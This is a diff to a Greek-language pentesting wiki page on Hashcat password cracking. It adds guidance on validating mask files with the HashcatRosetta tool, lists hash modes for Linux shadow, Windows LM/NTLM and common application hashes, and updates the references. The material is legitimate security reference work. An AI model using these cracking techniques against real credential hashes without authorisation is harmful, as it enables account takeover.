+Μια κακοσχηματισμένη γραμμή μπορεί να χαθεί ανάμεσα σε έγκυρες μάσκες, γι’ αυτό επικυρώστε ολόκληρο το αρχείο και το εκτιμώμενο keyspace πριν ξεκινήσετε την επίθεση. Το HashcatRosetta αναφέρει τη γραμμή που προκαλεί το σφάλμα και επιστρέφει μη μηδενικό status όταν κάποια μάσκα δεν είναι έγκυρη, καθιστώντας τον έλεγχο κατάλληλο για scripts ή CI.<sup>[[6]](#references)[[9]](#references)</sup>
+
+```bash
+hashcat-rosetta masks.hcmask --verify-masks
+```
+
+Μην κανονικοποιείτε αρχεία mask με γενικούς CSV ή text parsers. Το Hashcat υποστηρίζει custom charsets `?1` έως `?8`, αντιμετωπίζει το `#` ως σχόλιο μόνο όταν είναι το πρώτο byte και αφαιρεί τα backslash escapes σε ένα πέρασμα πριν ερμηνεύσει τα tokens `?`. Επομένως, τα αρχικά κενά πριν από το `#` αποτελούν δεδομένα mask, ενώ το escaping μπορεί να αλλάξει το αν μια ακολουθία είναι literal ή token charset.<sup>[[6]](#references)[[9]](#references)</sup>
+
 - Επίθεση Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`)
 
 ```bash
@@ -912,14 +950,14 @@ Cracking Linux Hashes - αρχείο /etc/shadow
 1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
 ```
 
-Cracking των Hashes των Windows
+Cracking των Windows Hashes
 
 ```
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
 
-Cracking hash συνηθισμένων εφαρμογών
+Cracking συνηθισμένων hashes εφαρμογών
 
 ```
   900 | MD4                                              | Raw Hash
@@ -935,7 +973,11 @@ Cracking hash συνηθισμένων εφαρμογών
 
 - [1] [Μέσα στο GoBruteforcer: προεπιλεγμένες ρυθμίσεις διακομιστών που δημιουργήθηκαν με AI, αδύναμοι κωδικοί πρόσβασης και καμπάνιες με επίκεντρο τα crypto](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
 - [2] [John the Ripper: `office2john.py`](https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py)
-- [3] [Hashcat: παραδείγματα hash και modes του Microsoft Office](https://hashcat.net/wiki/doku.php?id=example_hashes)
-- [4] [combinator attack του Hashcat](https://hashcat.net/wiki/doku.php?id=combinator_attack)
-- [5] [Σχεδιασμός διαδοχής για διαπιστευτήρια](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
+- [3] [Παραδείγματα hash του Hashcat και λειτουργίες Microsoft Office](https://hashcat.net/wiki/doku.php?id=example_hashes)
+- [4] [Επίθεση combinator του Hashcat](https://hashcat.net/wiki/doku.php?id=combinator_attack)
+- [5] [Σχεδιασμός κληρονομιάς διαπιστευτηρίων](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
+- [6] [Repository HashcatRosetta](https://github.com/bandrel/HashcatRosetta)
+- [7] [Υλοποίηση αρχείου debug του Hashcat](https://github.com/hashcat/hashcat/blob/master/src/debugfile.c)
+- [8] [Βοήθεια γραμμής εντολών του Hashcat](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-help.md)
+- [9] [HashcatRosetta: Διαβάζοντας τη Στήλη της Ροζέτας του password cracking](https://trustedsec.com/blog/hashcatrosetta-reading-the-rosetta-stone-of-password-cracking)
 {{#include ../banners/hacktricks-training.md}}
